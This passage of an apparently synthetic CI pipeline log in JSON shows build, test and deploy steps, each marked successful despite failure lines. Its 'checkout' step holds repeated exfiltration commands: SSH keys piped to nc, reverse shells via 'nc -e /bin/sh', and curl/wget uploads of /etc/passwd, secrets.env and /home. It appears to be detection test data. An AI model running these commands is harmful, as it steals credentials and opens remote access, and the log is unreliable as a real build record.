          "Installing react@1.13.0",
          "Compiling src/utils.go...",
          "Step 5/10: Building",
          "Step 10/10: Building",
          "Cache hit for key-5181",
          "Artifact uploaded: build.tar.gz (31MB)",
          "[12:00:29] INFO: Processing request",
          "Installing lodash@2.4.0",
          "Cache hit for key-1125",
          "Artifact uploaded: build.tar.gz (10MB)",
          "[12:00:29] INFO: Processing request",
          "Step 8/10: Building",
          "  PASS: test_auth_login (415ms)",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-28T12:02:24.400729",
        "finished_at": "2025-11-28T12:03:05.545550",
        "log_lines": [
          "=== Step: integration_tests ===",
          "[12:00:29] INFO: Processing request",
          "Installing webpack@1.1.0",
          "Cache hit for key-2910",
          "[12:00:29] ERROR: Connection failed",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (210ms)",
          "\u2717 build failed with exit code 22",
          "Compiling src/app.ts...",
          "[12:00:29] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing jest@3.11.0",
          "  PASS: test_api_health (496ms)",
          "[12:00:29] INFO: Processing request",
          "\u2713 build completed",
          "Cache hit for key-7891",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Artifact uploaded: build.tar.gz (37MB)",
          "  PASS: test_user_create (260ms)",
          "[12:00:29] INFO: Processing request",
          "\u2713 build completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Artifact uploaded: build.tar.gz (41MB)",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:29] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (25MB)",
          "  PASS: test_db_connect (241ms)",
          "\u2713 test completed",
          "Cache hit for key-5736",
          "Installing react@1.19.0",
          "Cache hit for key-9917",
          "Step 7/10: Building",
          "Compiling src/handler.rs...",
          "[12:00:29] ERROR: Connection failed",
          "Step 10/10: Building",
          "Compiling src/service.java...",
          "  PASS: test_auth_login (35ms)",
          "[12:00:29] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (33MB)",
          "FAILED: test_auth_login",
          "[12:00:29] INFO: Processing request",
          "  PASS: test_db_connect (64ms)",
          "Cache hit for key-3823",
          "Compiling src/main.py...",
          "Compiling src/utils.go...",
          "  PASS: test_db_connect (460ms)",
          "Compiling src/service.java...",
          "Step 3/10: Building",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (125ms)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Step 7/10: Building",
          "[12:00:29] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 build completed",
          "  PASS: test_db_connect (431ms)",
          "[12:00:29] INFO: Processing request",
          "Cache hit for key-9013",
          "WARNING: jest has known vulnerabilities",
          "Compiling src/main.py...",
          "[12:00:29] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Installing express@5.2.0",
          "Step 6/10: Building",
          "  PASS: test_auth_login (78ms)",
          "Cache hit for key-4160",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing lodash@3.3.0",
          "  PASS: test_user_create (248ms)",
          "Installing axios@5.17.0",
          "[12:00:29] ERROR: Connection failed",
          "Cache hit for key-3106",
          "  PASS: test_api_health (366ms)",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Cache hit for key-5060",
          "Step 8/10: Building",
          "  PASS: test_auth_login (478ms)",
          "\u2713 build completed",
          "Cache hit for key-5605",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Compiling src/handler.rs...",
          "Cache hit for key-9305",
          "Compiling src/index.js...",
          "Installing axios@5.7.0",
          "Step 9/10: Building",
          "Installing eslint@2.3.0",
          "[12:00:29] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Cache hit for key-4227",
          "Step 6/10: Building",
          "\u2713 lint completed",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:29] WARN: Deprecated API usage",
          "Step 4/10: Building",
          "\u2713 lint completed",
          "Installing express@1.4.0",
          "Artifact uploaded: build.tar.gz (12MB)",
          "[12:00:29] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:29] INFO: Processing request",
          "Installing lodash@5.2.0",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "Cache hit for key-3505",
          "\u2713 test completed",
          "[12:00:29] WARN: Deprecated API usage",
          "Step 4/10: Building",
          "Compiling src/service.java...",
          "Cache hit for key-2321",
          "Cache hit for key-8263",
          "  PASS: test_api_health (386ms)",
          "  PASS: test_auth_login (334ms)",
          "Compiling src/app.ts...",
          "\u2713 test completed",
          "  PASS: test_auth_login (113ms)",
          "Cache hit for key-9997",
          "Cache hit for key-3157",
          "[12:00:29] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (50MB)",
          "WARNING: lodash has known vulnerabilities",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-28T12:03:05.545550",
        "finished_at": "2025-11-28T12:03:13.774514",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Cache hit for key-1827",
          "Step 4/10: Building",
          "Installing prettier@4.6.0",
          "Compiling src/handler.rs...",
          "Compiling src/utils.go...",
          "Installing webpack@4.3.0",
          "[12:00:29] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Compiling src/utils.go...",
          "Installing prettier@1.1.0",
          "[12:00:29] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing express@5.18.0",
          "\u2713 build completed",
          "Installing lodash@4.16.0",
          "Installing eslint@4.9.0",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (4MB)",
          "  PASS: test_auth_login (399ms)",
          "  PASS: test_auth_login (343ms)",
          "Cache hit for key-7739",
          "Artifact uploaded: build.tar.gz (34MB)",
          "\u2713 test completed",
          "[12:00:29] INFO: Processing request",
          "Installing jest@4.13.0",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Step 8/10: Building",
          "[12:00:29] INFO: Processing request",
          "Installing react@4.5.0",
          "\u2713 test completed",
          "Installing prettier@3.11.0",
          "WARNING: prettier has known vulnerabilities",
          "Step 7/10: Building",
          "[12:00:29] INFO: Processing request",
          "[12:00:29] WARN: Deprecated API usage",
          "Step 8/10: Building",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/main.py...",
          "Compiling src/index.js...",
          "WARNING: prettier has known vulnerabilities",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:29] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Installing react@3.4.0",
          "[12:00:29] INFO: Processing request",
          "  PASS: test_auth_login (316ms)",
          "\u2713 build completed",
          "Installing lodash@4.6.0",
          "  PASS: test_cache_hit (1ms)",
          "Cache hit for key-7480",
          "Step 5/10: Building",
          "Step 7/10: Building",
          "Step 3/10: Building",
          "[12:00:29] INFO: Processing request",
          "Compiling src/app.ts...",
          "Cache hit for key-2595",
          "[12:00:29] INFO: Processing request",
          "Compiling src/service.java...",
          "  PASS: test_api_health (349ms)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 lint completed",
          "[12:00:29] INFO: Processing request",
          "Cache hit for key-9810",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 7/10: Building",
          "Installing jest@2.12.0",
          "\u2713 test completed",
          "[12:00:29] INFO: Processing request",
          "[12:00:29] INFO: Processing request",
          "\u2713 build completed",
          "\u2717 build failed with exit code 18",
          "Installing jest@3.12.0",
          "Installing react@3.5.0",
          "  PASS: test_db_connect (222ms)",
          "Cache hit for key-7246",
          "  PASS: test_cache_hit (30ms)",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_db_connect (69ms)",
          "Cache hit for key-5722",
          "  PASS: test_user_create (252ms)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Cache hit for key-6016",
          "[12:00:29] INFO: Processing request",
          "Cache hit for key-2358",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "Compiling src/main.py...",
          "[12:00:29] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Installing prettier@4.15.0",
          "Cache hit for key-7113",
          "Step 6/10: Building",
          "Compiling src/service.java...",
          "[12:00:29] INFO: Processing request",
          "Compiling src/index.js...",
          "FAILED: test_api_health",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Installing express@2.12.0",
          "\u2717 build failed with exit code 110",
          "[12:00:29] INFO: Processing request",
          "Step 9/10: Building",
          "WARNING: lodash has known vulnerabilities",
          "Step 7/10: Building",
          "  PASS: test_db_connect (342ms)",
          "Step 7/10: Building",
          "Step 9/10: Building",
          "[12:00:29] ERROR: Connection failed",
          "FAILED: test_cache_hit",
          "Compiling src/service.java...",
          "[12:00:29] WARN: Deprecated API usage",
          "\u2713 test completed",
          "Cache hit for key-3363",
          "WARNING: lodash has known vulnerabilities",
          "Compiling src/app.ts...",
          "[12:00:29] WARN: Deprecated API usage",
          "\u2713 test completed",
          "  PASS: test_cache_hit (183ms)",
          "Artifact uploaded: build.tar.gz (1MB)",
          "  PASS: test_db_connect (345ms)",
          "Step 10/10: Building",
          "[12:00:29] INFO: Processing request",
          "Step 2/10: Building",
          "Compiling src/index.js...",
          "\u2717 build failed with exit code 64",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-28T12:03:13.774514",
        "finished_at": "2025-11-28T12:04:15.491746",
        "log_lines": [
          "=== Step: build ===",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "[12:00:29] INFO: Processing request",
          "Step 3/10: Building",
          "Compiling src/index.js...",
          "Cache hit for key-7744",
          "Cache hit for key-1719",
          "Installing jest@2.19.0",
          "Artifact uploaded: build.tar.gz (42MB)",
          "WARNING: express has known vulnerabilities",
          "  PASS: test_cache_hit (36ms)",
          "  PASS: test_auth_login (219ms)",
          "  PASS: test_db_connect (190ms)",
          "Installing webpack@5.1.0",
          "\u2717 build failed with exit code 84",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Cache hit for key-2038",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "\u2717 build failed with exit code 83",
          "[12:00:29] WARN: Deprecated API usage",
          "[12:00:29] INFO: Processing request",
          "[12:00:29] INFO: Processing request",
          "Compiling src/app.ts...",
          "Installing lodash@2.18.0",
          "Compiling src/utils.go...",
          "Cache hit for key-4352",
          "\u2713 build completed",
          "Cache hit for key-1624",
          "Step 5/10: Building",
          "[12:00:29] INFO: Processing request",
          "Step 9/10: Building",
          "[12:00:29] INFO: Processing request",
          "Cache hit for key-2662",
          "  PASS: test_api_health (413ms)",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Installing express@3.11.0",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (34MB)",
          "[12:00:29] INFO: Processing request",
          "Cache hit for key-5919",
          "Compiling src/main.py...",
          "  PASS: test_auth_login (470ms)",
          "Cache hit for key-3482",
          "Artifact uploaded: build.tar.gz (36MB)",
          "  PASS: test_db_connect (173ms)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Step 2/10: Building",
          "[12:00:29] INFO: Processing request",
          "Installing react@3.17.0",
          "  PASS: test_auth_login (379ms)",
          "[12:00:29] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:29] INFO: Processing request",
          "Cache hit for key-1392",
          "  PASS: test_db_connect (186ms)",
          "Cache hit for key-5938",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (12MB)",
          "  PASS: test_user_create (244ms)",
          "Compiling src/index.js...",
          "  PASS: test_db_connect (306ms)",
          "Compiling src/app.ts...",
          "Installing axios@1.10.0",
          "Step 6/10: Building",
          "Installing react@5.2.0",
          "Step 1/10: Building",
          "  PASS: test_auth_login (130ms)",
          "Installing lodash@2.19.0",
          "  PASS: test_db_connect (184ms)",
          "Cache hit for key-4400",
          "\u2713 lint completed",
          "[12:00:29] INFO: Processing request",
          "Step 1/10: Building",
          "  PASS: test_db_connect (147ms)",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Compiling src/app.ts...",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "[12:00:29] INFO: Processing request",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (37MB)",
          "  PASS: test_user_create (260ms)",
          "Artifact uploaded: build.tar.gz (11MB)",
          "[12:00:29] INFO: Processing request",
          "Compiling src/handler.rs...",
          "  PASS: test_auth_login (281ms)",
          "Step 9/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (33MB)",
          "[12:00:29] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 5",
          "FAILED: test_db_connect",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Installing react@4.5.0",
          "Cache hit for key-3272",
          "Compiling src/service.java...",
          "Installing express@5.13.0",
          "Installing jest@5.6.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_api_health (42ms)",
          "  PASS: test_auth_login (359ms)",
          "Installing react@4.11.0",
          "WARNING: jest has known vulnerabilities",
          "WARNING: lodash has known vulnerabilities",
          "Cache hit for key-3163",
          "Compiling src/app.ts...",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Step 7/10: Building",
          "Cache hit for key-8626",
          "  PASS: test_auth_login (14ms)",
          "Installing prettier@1.18.0",
          "  PASS: test_api_health (70ms)",
          "\u2713 test completed",
          "[12:00:29] INFO: Processing request",
          "Step 6/10: Building",
          "Cache hit for key-2128",
          "Artifact uploaded: build.tar.gz (20MB)",
          "WARNING: jest has known vulnerabilities",
          "  PASS: test_api_health (359ms)",
          "Step 4/10: Building",
          "Compiling src/service.java...",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-28T12:04:15.491746",
        "finished_at": "2025-11-28T12:04:36.064157",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "[12:00:29] ERROR: Connection failed",
          "[12:00:29] INFO: Processing request",
          "[12:00:29] INFO: Processing request",
          "\u2713 lint completed",
          "Exception: TypeError",
          "Cache hit for key-6613",
          "\u2713 lint completed",
          "\u2713 test completed",
          "[12:00:29] INFO: Processing request",
          "Step 9/10: Building",
          "  PASS: test_cache_hit (112ms)",
          "Cache hit for key-7615",
          "Installing webpack@4.0.0",
          "  PASS: test_db_connect (369ms)",
          "Artifact uploaded: build.tar.gz (12MB)",
          "[12:00:29] INFO: Processing request",
          "  PASS: test_auth_login (191ms)",
          "Artifact uploaded: build.tar.gz (40MB)",
          "[12:00:29] INFO: Processing request",
          "Installing webpack@4.14.0",
          "Artifact uploaded: build.tar.gz (27MB)",
          "\u2713 lint completed",
          "[12:00:29] INFO: Processing request",
          "  PASS: test_cache_hit (471ms)",
          "Installing eslint@5.8.0",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Cache hit for key-8053",
          "Cache hit for key-8581",
          "Step 3/10: Building",
          "Installing express@3.17.0",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "[12:00:29] ERROR: Connection failed",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Cache hit for key-8989",
          "WARNING: react has known vulnerabilities",
          "\u2713 lint completed",
          "\u2713 build completed",
          "[12:00:29] INFO: Processing request",
          "\u2713 lint completed",
          "Cache hit for key-6697",
          "\u2713 build completed",
          "[12:00:29] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (36MB)",
          "[12:00:29] INFO: Processing request",
          "Installing eslint@4.16.0",
          "Cache hit for key-1101",
          "Artifact uploaded: build.tar.gz (45MB)",
          "  PASS: test_api_health (74ms)",
          "Installing webpack@3.14.0",
          "Cache hit for key-9156",
          "Artifact uploaded: build.tar.gz (47MB)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Artifact uploaded: build.tar.gz (34MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_api_health (167ms)",
          "Installing prettier@4.6.0",
          "Artifact uploaded: build.tar.gz (19MB)",
          "  PASS: test_auth_login (167ms)",
          "Installing react@2.6.0",
          "Step 1/10: Building",
          "[12:00:29] WARN: Deprecated API usage",
          "Compiling src/utils.go...",
          "  PASS: test_user_create (336ms)",
          "Installing express@5.20.0",
          "  PASS: test_api_health (49ms)",
          "Step 4/10: Building",
          "Exception: TypeError",
          "[12:00:29] WARN: Deprecated API usage",
          "  PASS: test_user_create (358ms)",
          "  PASS: test_db_connect (183ms)",
          "WARNING: jest has known vulnerabilities",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:29] INFO: Processing request",
          "Compiling src/handler.rs...",
          "WARNING: axios has known vulnerabilities",
          "Cache hit for key-6323",
          "WARNING: react has known vulnerabilities",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Cache hit for key-4169",
          "Step 4/10: Building",
          "Compiling src/index.js...",
          "Cache hit for key-3984",
          "Compiling src/app.ts...",
          "\u2713 test completed",
          "\u2713 test completed",
          "Exception: ValueError",
          "Cache hit for key-7144",
          "Cache hit for key-7346",
          "[12:00:29] INFO: Processing request",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Artifact uploaded: build.tar.gz (11MB)",
          "\u2713 build completed",
          "Cache hit for key-8502",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Step 8/10: Building",
          "Compiling src/utils.go...",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "\u2717 build failed with exit code 51",
          "Artifact uploaded: build.tar.gz (2MB)",
          "[12:00:29] INFO: Processing request",
          "  PASS: test_api_health (251ms)",
          "  PASS: test_cache_hit (57ms)",
          "  PASS: test_user_create (256ms)",
          "  PASS: test_user_create (359ms)",
          "  PASS: test_user_create (37ms)",
          "Artifact uploaded: build.tar.gz (14MB)",
          "  PASS: test_db_connect (448ms)",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Cache hit for key-5633",
          "Cache hit for key-1045",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Exception: TypeError",
          "[12:00:29] INFO: Processing request",
          "Step 9/10: Building",
          "Step 8/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-3974",
          "\u2713 test completed",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-28T12:04:36.064157",
        "finished_at": "2025-11-28T12:04:56.636568",
        "log_lines": [
          "=== Step: type_check ===",
          "[12:00:29] INFO: Processing request",
          "Installing jest@4.14.0",
          "Artifact uploaded: build.tar.gz (27MB)",
          "[12:00:29] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (9MB)",
          "  PASS: test_db_connect (76ms)",
          "Cache hit for key-9420",
          "Cache hit for key-7172",
          "Step 3/10: Building",
          "Cache hit for key-8349",
          "\u2713 test completed",
          "\u2713 lint completed",
          "  PASS: test_db_connect (82ms)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "WARNING: prettier has known vulnerabilities",
          "Cache hit for key-4461",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 4/10: Building",
          "Installing lodash@3.7.0",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (33MB)",
          "\u2713 lint completed",
          "Step 1/10: Building",
          "  PASS: test_api_health (299ms)",
          "Step 7/10: Building",
          "[12:00:29] INFO: Processing request",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Installing webpack@4.14.0",
          "Step 5/10: Building",
          "WARNING: express has known vulnerabilities",
          "Installing prettier@3.13.0",
          "Cache hit for key-8406",
          "Compiling src/index.js...",
          "  PASS: test_user_create (165ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing lodash@2.11.0",
          "Cache hit for key-8730",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "[12:00:29] INFO: Processing request",
          "  PASS: test_cache_hit (447ms)",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Step 2/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-8491",
          "[12:00:29] INFO: Processing request",
          "Installing lodash@1.13.0",
          "[12:00:29] WARN: Deprecated API usage",
          "Cache hit for key-5980",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Installing prettier@3.2.0",
          "Cache hit for key-3795",
          "  PASS: test_db_connect (151ms)",
          "\u2713 test completed",
          "  PASS: test_cache_hit (440ms)",
          "Step 4/10: Building",
          "Step 10/10: Building",
          "[12:00:29] INFO: Processing request",
          "Cache hit for key-3858",
          "Cache hit for key-6340",
          "  PASS: test_api_health (352ms)",
          "Cache hit for key-6562",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Compiling src/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Cache hit for key-4649",
          "[12:00:29] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_cache_hit (460ms)",
          "Compiling src/index.js...",
          "Step 4/10: Building",
          "WARNING: express has known vulnerabilities",
          "Installing prettier@5.11.0",
          "\u2717 build failed with exit code 29",
          "[12:00:29] WARN: Deprecated API usage",
          "Cache hit for key-8738",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Compiling src/index.js...",
          "[12:00:29] WARN: Deprecated API usage",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Step 2/10: Building",
          "Compiling src/handler.rs...",
          "Cache hit for key-5343",
          "[12:00:29] INFO: Processing request",
          "Cache hit for key-1162",
          "Installing lodash@3.15.0",
          "[12:00:29] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (9MB)",
          "  PASS: test_api_health (50ms)",
          "[12:00:29] INFO: Processing request",
          "\u2713 lint completed",
          "Step 9/10: Building",
          "Step 7/10: Building",
          "WARNING: react has known vulnerabilities",
          "Installing axios@2.18.0",
          "[12:00:29] INFO: Processing request",
          "  PASS: test_user_create (350ms)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Compiling src/utils.go...",
          "Compiling src/service.java...",
          "Compiling src/app.ts...",
          "[12:00:29] INFO: Processing request",
          "Step 8/10: Building",
          "Installing jest@5.20.0",
          "  PASS: test_db_connect (305ms)",
          "  PASS: test_db_connect (425ms)",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Installing prettier@1.4.0",
          "[12:00:29] INFO: Processing request",
          "Step 1/10: Building",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-28T12:04:56.636568",
        "finished_at": "2025-11-28T12:05:04.865532",
        "log_lines": [
          "=== Step: checkout ===",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "Installing axios@1.14.0",
          "  PASS: test_db_connect (340ms)",
          "  PASS: test_auth_login (456ms)",
          "Cache hit for key-3221",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 161.22.228.28 12249",
          "  PASS: test_api_health (367ms)",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "Compiling src/utils.go...",
          "  PASS: test_auth_login (53ms)",
          "Step 8/10: Building",
          "  PASS: test_api_health (486ms)",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Cache hit for key-3742",
          "  PASS: test_cache_hit (410ms)",
          "\u2713 build completed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Compiling src/index.js...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 56.59.213.157 4874",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Compiling src/handler.rs...",
          "[12:00:29] ERROR: Connection failed",
          "\u2713 test completed",
          "[12:00:29] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (33MB)",
          "[12:00:29] WARN: Deprecated API usage",
          "[12:00:29] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (24MB)",
          "[12:00:29] INFO: Processing request",
          "  PASS: test_auth_login (234ms)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Cache hit for key-7647",
          "[12:00:29] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (17MB)",
          "[12:00:29] INFO: Processing request",
          "[12:00:29] INFO: Processing request",
          "Installing jest@2.11.0",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 190.144.122.84 39718",
          "Compiling src/service.java...",
          "Compiling src/main.py...",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "Compiling src/handler.rs...",
          "Cache hit for key-9466",
          "  PASS: test_cache_hit (62ms)",
          "Installing lodash@2.18.0",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Installing prettier@4.7.0",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "Compiling src/app.ts...",
          "  PASS: test_db_connect (296ms)",
          "WARNING: react has known vulnerabilities",
          "Installing react@4.8.0",
          "[12:00:29] INFO: Processing request",
          "nc -e /bin/sh 222.169.29.221 27410",
          "Installing lodash@1.1.0",
          "Installing webpack@2.15.0",
          "  PASS: test_user_create (248ms)",
          "Step 7/10: Building",
          "Compiling src/utils.go...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 186.64.49.146 13773",
          "Artifact uploaded: build.tar.gz (37MB)",
          "  PASS: test_db_connect (496ms)",
          "[12:00:29] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (5MB)",
          "  PASS: test_api_health (90ms)",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "  PASS: test_api_health (363ms)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "Compiling src/app.ts...",
          "  PASS: test_cache_hit (9ms)",
          "[12:00:29] WARN: Deprecated API usage",
          "Cache hit for key-9776",
          "[12:00:29] WARN: Deprecated API usage",
          "Exception: RuntimeError",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (50MB)",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Step 6/10: Building",
          "Step 1/10: Building",
          "nc -e /bin/sh 87.188.254.23 48320",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Step 7/10: Building",
          "FAILED: test_api_health",
          "WARNING: eslint has known vulnerabilities",
          "Cache hit for key-4753",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 22.97.117.101 16646",
          "Cache hit for key-3245",
          "  PASS: test_user_create (91ms)",
          "\u2717 build failed with exit code 106",
          "Step 10/10: Building",
          "nc -e /bin/sh 107.240.246.168 3355",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Artifact uploaded: build.tar.gz (41MB)",
          "WARNING: eslint has known vulnerabilities",
          "nc -e /bin/sh 86.211.224.81 46728",
          "Installing react@1.5.0",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "WARNING: lodash has known vulnerabilities",
          "Step 10/10: Building",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (1MB)",
          "  PASS: test_auth_login (223ms)",
          "Cache hit for key-3714",
          "Step 1/10: Building",
          "Cache hit for key-6119",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (22MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (7MB)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "Artifact uploaded: build.tar.gz (21MB)",
          "  PASS: test_api_health (158ms)",
          "[12:00:29] INFO: Processing request",
          "[12:00:29] ERROR: Connection failed",
          "[12:00:29] INFO: Processing request",
          "Step 8/10: Building",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "Cache hit for key-1228",
          "\u2713 test completed",
          "Installing webpack@1.20.0",
          "\u2713 lint completed",
          "[12:00:29] INFO: Processing request",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "Step 8/10: Building",
          "Compiling src/main.py...",
          "[12:00:29] INFO: Processing request",
          "  PASS: test_user_create (397ms)",
          "curl -X POST https://example.com/collect -d @secrets.env",
